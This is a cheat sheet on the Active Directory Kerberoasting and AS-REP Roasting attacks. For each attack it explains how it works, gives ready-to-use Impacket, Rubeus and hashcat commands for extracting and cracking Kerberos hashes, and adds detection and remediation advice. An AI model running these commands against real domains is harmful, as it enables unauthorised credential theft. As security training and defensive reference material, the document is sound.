## 🔑 Cheatsheet: Active Directory Roasting Attacks

"Roasting" in Active Directory refers to a class of attacks that abuse features of the Kerberos authentication protocol to extract service or user account credential material. This material (a hash) is then taken offline to be cracked, allowing an attacker to recover the account's plaintext password.

---

### ## Kerberoasting

**Overview:** An offline attack to crack the passwords of **service accounts**. Kerberoasting targets accounts that have a Service Principal Name (SPN) registered, which is common for services like MSSQL, HTTP, or custom applications. The vulnerability exists because the Kerberos TGS ticket is encrypted with the service account's password hash and can be requested by any authenticated domain user.

#### **How It Works**

1.  An attacker, as any authenticated domain user, queries the Domain Controller for accounts with SPNs.
2.  The attacker requests a Kerberos Ticket Granting Service (TGS) ticket for a specific service.
3.  The Domain Controller returns a TGS ticket, a portion of which is encrypted with the service account's NTLM hash.
4.  The attacker extracts this encrypted portion from the ticket.
5.  The hash is taken offline and cracked using tools like Hashcat to reveal the service account's plaintext password.
    

#### **Execution Workflow**

* **From Linux (using Impacket):**
    ```bash
    # GetUserSPNs.py requests TGS tickets for accounts with SPNs and extracts the hash
    # -dc-ip: Domain Controller IP
    # -request: Requests the TGS ticket
    # <domain>/<user>:<password> : Authenticated user credentials
    GetUserSPNs.py -dc-ip <DC_IP> -request <domain>/<user>
    ```

* **From Windows (using Rubeus):**
    ```powershell
    # Rubeus is a powerful, modern tool for Kerberos interaction
    Rubeus.exe kerberoast /outfile:hashes.txt
    ```

* **Cracking the Hash (with Hashcat):**
    The extracted hash can be cracked offline using a wordlist.
    ```bash
    # -m 13100 is the mode for Kerberos 5 TGS-REP tickets
    hashcat -m 13100 hashes.txt /path/to/wordlist.txt
    ```

#### **🛡️ Detection & Remediation**

* **Detection:** Monitor for an unusual number of TGS ticket requests (Event ID 4769) from a single user or host. Security tools can also detect requests for tickets using weak RC4-HMAC encryption.
* **Remediation:**
    * **Strong Passwords:** Enforce long (25+ characters), complex, and unique passwords for all service accounts. These accounts are high-value targets.
    * **Use Group Managed Service Accounts (gMSAs):** gMSAs use automatically managed, 240-character complex passwords that are rotated by the domain, making them immune to offline cracking.
    * **Audit & Monitor:** Regularly audit accounts with SPNs for weak passwords and monitor for signs of Kerberoasting activity.

---

### ## AS-REP Roasting

**Overview:** An offline attack to crack the passwords of **user accounts** that have a specific, insecure setting enabled: **"Do not require Kerberos preauthentication."** Pre-authentication is a security measure that proves a user knows their password *before* the Domain Controller sends them encrypted material. If this is disabled, anyone can request the initial encrypted material for a user and attempt to crack it offline.

#### **How It Works**

1.  An attacker finds user accounts that do not require Kerberos pre-authentication.
2.  The attacker sends an Authentication Server Request (AS-REQ) for one of these users to the Domain Controller.
3.  Because pre-authentication is disabled, the DC immediately returns an Authentication Server Response (AS-REP) containing a portion encrypted with the user's password hash.
4.  The attacker extracts this hash and takes it offline to crack.

#### **Execution Workflow**

* **From Linux (using Impacket):**
    ```bash
    # GetNPUsers.py finds and requests hashes for users with pre-auth disabled
    # -no-pass: No password is needed to make the request
    GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile hashes.txt
    ```

* **From Windows (using Rubeus):**
    ```powershell
    # Rubeus can discover and roast these accounts in one command
    Rubeus.exe asreproast /outfile:hashes.txt
    ```

* **Cracking the Hash (with Hashcat):**
    ```bash
    # -m 18200 is the mode for Kerberos 5 AS-REP tickets
    hashcat -m 18200 hashes.txt /path/to/wordlist.txt
    ```

#### **🛡️ Detection & Remediation**

* **Detection:** Monitor for Kerberos authentication events (Event ID 4768) where the "Pre-Authentication Type" is 0. A high volume of these requests for different users from a single source is a strong indicator of an AS-REP Roasting attack.
* **Remediation:**
    * **Enable Pre-authentication:** This is the most critical fix. Audit Active Directory for any user or computer accounts that have "Do not require Kerberos preauthentication" enabled and disable this setting. There are very few legitimate reasons for it to be disabled.
    * **Enforce Strong Passwords:** A strong password policy makes offline cracking much more difficult, even if an AS-REP hash is obtained.
    * **Monitor Privileged Accounts:** Pay special attention to privileged accounts (e.g., members of Domain Admins) to ensure pre-authentication is always enabled.
